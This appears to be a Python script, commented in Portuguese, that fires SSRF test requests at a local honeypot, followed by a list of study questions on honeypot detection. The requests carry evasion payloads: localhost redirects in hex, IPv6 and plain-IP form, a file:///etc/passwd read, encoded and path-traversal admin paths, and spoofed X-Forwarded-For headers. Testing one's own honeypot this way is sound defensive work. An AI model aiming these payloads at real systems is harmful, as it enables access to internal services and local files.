import requests
import urllib.parse

def ssrf_test(target_url):
    # Casos de teste com diferentes técnicas de evasão
    test_cases = [
        {"url": f"{target_url}/admin", "desc": "Tentativa de acessar página administrativa"},
        {"url": f"{target_url}/internal", "desc": "Tentativa de acessar recurso interno"},
        {"url": f"{target_url}/sensitive", "desc": "Tentativa de acessar recurso sensível"},
        {"url": f"{target_url}/?url=http://localhost:8000", "desc": "Tentativa de redirecionamento"},
        {"url": f"{target_url}/?redirect=http://localhost:8000", "desc": "Tentativa de redirecionamento via parâmetro redirect"},
        {"url": f"{target_url}/?file=file:///etc/passwd", "desc": "Tentativa de acesso a arquivo local"},
        {"url": f"{target_url}/?url=https://example.com", "desc": "Tentativa de acessar URL externa"},
        {"url": f"{target_url}/%61%64%6d%69%6e", "desc": "Tentativa de acessar página administrativa com codificação de URL"},
        {"url": f"{target_url}/..%2fadmin", "desc": "Tentativa de path traversal para página administrativa"},
        {"url": f"{target_url}/?url=localhost", "desc": "Tentativa de redirecionamento sem http"},
        {"url": f"{target_url}/?url=http://127.0.0.1", "desc": "Tentativa de redirecionamento para localhost via IP"},
        {"url": f"{target_url}/?url=http://[::1]", "desc": "Tentativa de redirecionamento para localhost via IPv6"},
        {"url": f"{target_url}/?url=http://0x7f000001", "desc": "Tentativa de redirecionamento para localhost via IP hexadecimal"},
    ]

    # Cabeçalhos customizados para tentar evadir a detecção
    headers_list = [
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"Referer": "http://example.com"},
        {"X-Real-IP": "127.0.0.1"}
    ]

    for case in test_cases:
        for headers in headers_list:
            print(f"Testando: {case['desc']} com headers {headers}")
            try:
                response = requests.get(case["url"], headers=headers)
                print(f"Resposta: {response.status_code}\nConteúdo: {response.content}\n")
            except Exception as e:
                print(f"Erro durante o teste: {e}")

# URL do honeypot
honey_pot_url = "http://localhost:8000"
ssrf_test(honey_pot_url)


'''

What are some common indicators of an SSRF attack?
How can URL encoding be used in an SSRF attack?
What is the purpose of logging requests in a honeypot?
How can analyzing HTTP headers help in detecting SSRF attacks?
What role do suspicious keywords play in identifying malicious requests?
Why is it important to decode URLs when analyzing requests?
How can sending alerts via email enhance honeypot monitoring?
What are the potential risks of not monitoring internal services for SSRF attacks?
How can path traversal techniques be used in SSRF attacks?
Why is it essential to handle various HTTP methods (GET, POST, PUT, DELETE, OPTIONS) in a honeypot?
What is the significance of the 'X-Forwarded-For' header in SSRF detection?
How can IP spoofing affect the accuracy of honeypot logs?
What are some effective ways to evade detection in a honeypot?
How can a honeypot be configured to detect evasive SSRF techniques?
Why is it crucial to have a robust alerting mechanism for honeypot activities?
How can the analysis of request patterns help in identifying targeted attacks?
What are the ethical considerations when deploying a honeypot?
How can you ensure that your honeypot does not become a vector for further attacks?
What are some common challenges in maintaining an effective honeypot?
How can you differentiate between legitimate traffic and malicious traffic in honeypot logs?
What are some advanced techniques attackers might use to bypass honeypot detection?
How can integrating a honeypot with a web interface improve monitoring and response?
What is the importance of regular updates and maintenance for a honeypot?
How can you leverage machine learning to enhance honeypot capabilities?
What are some best practices for securing the server running the honeypot?
How can collaborative threat intelligence improve the effectiveness of honeypots?
'''